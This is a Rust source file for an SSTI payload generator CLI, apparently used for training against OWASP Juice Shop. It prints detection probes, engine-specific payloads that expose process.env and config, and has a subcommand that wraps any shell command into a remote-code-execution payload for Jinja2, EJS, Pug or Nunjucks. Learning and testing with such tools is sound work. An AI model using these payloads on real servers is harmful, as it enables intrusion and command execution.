//! SSTI payload generator CLI
//!
//! Usage:
//!   ssti-gen detect
//!   ssti-gen jinja2
//!   ssti-gen nodejs
//!   ssti-gen rce jinja2 "id"
//!   ssti-gen fuzz
//!   ssti-gen juice-shop

use clap::{Parser, Subcommand, ValueEnum};
use web_security_toolkit::ssti::*;

#[derive(Parser)]
#[command(name = "ssti-gen")]
#[command(about = "Server-Side Template Injection payload generator")]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Detection payloads to identify SSTI
    Detect,
    /// Jinja2/Python template payloads
    Jinja2,
    /// Node.js template payloads (EJS, Pug, Nunjucks)
    Nodejs,
    /// Generate RCE payload for specific engine
    Rce {
        /// Template engine
        #[arg(value_enum)]
        engine: EngineArg,
        /// Command to execute
        command: String,
    },
    /// All fuzzing payloads
    Fuzz {
        /// Output as list only
        #[arg(short, long)]
        list: bool,
    },
    /// Juice Shop SSTI challenge payloads
    JuiceShop,
    /// List all supported engines
    Engines,
}

#[derive(Debug, Copy, Clone, PartialEq, Eq, ValueEnum)]
enum EngineArg {
    Jinja2,
    Ejs,
    Pug,
    Nunjucks,
}

fn main() {
    let cli = Cli::parse();

    match cli.command {
        Commands::Detect => {
            println!("=== SSTI Detection Payloads ===\n");
            println!("Test these payloads to identify SSTI vulnerability:\n");

            for payload in detection_payloads() {
                println!("{}", payload.name);
                println!("  Payload: {}", payload.payload);
                println!("  Engine:  {:?}", payload.engine);
                println!("  Expect:  49 (if vulnerable)\n");
            }

            println!("Detection methodology:");
            println!("  1. Submit {{{{7*7}}}} - if 49 appears, likely Jinja2/Twig");
            println!("  2. Submit ${{7*7}} - if 49 appears, likely Java EL");
            println!("  3. Submit #{{7*7}} - if 49 appears, likely Pug/Ruby");
            println!("  4. Submit <%= 7*7 %> - if 49 appears, likely EJS/ERB");
        }
        Commands::Jinja2 => {
            println!("=== Jinja2/Python SSTI Payloads ===\n");

            for payload in jinja2_payloads() {
                println!("{}", payload.name);
                println!("  {}", payload.payload);
                println!("  Purpose: {:?}\n", payload.purpose);
            }
        }
        Commands::Nodejs => {
            println!("=== Node.js Template Engine Payloads ===\n");

            for payload in nodejs_payloads() {
                println!("[{:?}] {}", payload.engine, payload.name);
                println!("  {}", payload.payload);
                println!("  Purpose: {:?}\n", payload.purpose);
            }
        }
        Commands::Rce { engine, command } => {
            let template_engine = match engine {
                EngineArg::Jinja2 => TemplateEngine::Jinja2,
                EngineArg::Ejs => TemplateEngine::Ejs,
                EngineArg::Pug => TemplateEngine::Pug,
                EngineArg::Nunjucks => TemplateEngine::Nunjucks,
            };

            match generate_rce_payload(template_engine, &command) {
                Some(payload) => {
                    println!("=== RCE Payload for {:?} ===\n", engine);
                    println!("Command: {}", command);
                    println!("\nPayload:");
                    println!("{}", payload);
                }
                None => {
                    eprintln!("RCE payload not available for {:?}", engine);
                    std::process::exit(1);
                }
            }
        }
        Commands::Fuzz { list } => {
            let payloads = ssti_fuzz_payloads();

            if list {
                for payload in payloads {
                    println!("{}", payload);
                }
            } else {
                println!("=== SSTI Fuzzing Payloads ===\n");
                println!("Count: {} payloads\n", payloads.len());

                for payload in payloads {
                    println!("  {}", payload);
                }

                println!("\nUse --list for output suitable for fuzzing tools");
            }
        }
        Commands::JuiceShop => {
            println!("=== Juice Shop SSTI Challenge ===\n");

            println!("Target: Pug template engine\n");

            for payload in juice_shop_ssti() {
                println!("{}", payload.name);
                println!("  {}", payload.payload);
                println!("  Purpose: {:?}\n", payload.purpose);
            }

            println!("Tips:");
            println!("  - The vulnerable endpoint processes user input through Pug");
            println!("  - Look for template injection in profile or comment fields");
            println!("  - Use #{{}} syntax for Pug templates");
        }
        Commands::Engines => {
            println!("=== Supported Template Engines ===\n");

            println!("Python:");
            println!("  - Jinja2   {{{{config}}}}, {{{{7*7}}}}");
            println!();
            println!("Node.js:");
            println!("  - EJS      <%= process.env %>");
            println!("  - Pug      #{{process.env}}");
            println!("  - Nunjucks {{{{constructor.constructor('...')()}}}}");
            println!();
            println!("Java:");
            println!("  - FreeMarker ${{7*7}}");
            println!("  - Velocity   #set($x=7*7)$x");
            println!();
            println!("PHP:");
            println!("  - Twig     {{{{7*7}}}}");
            println!("  - Smarty   {{7*7}}");
        }
    }
}
